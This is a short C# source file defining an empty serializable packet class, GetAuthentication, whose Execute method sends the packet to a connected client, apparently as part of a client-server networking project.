using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetAuthentication : IPacket
    {
        public GetAuthentication()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}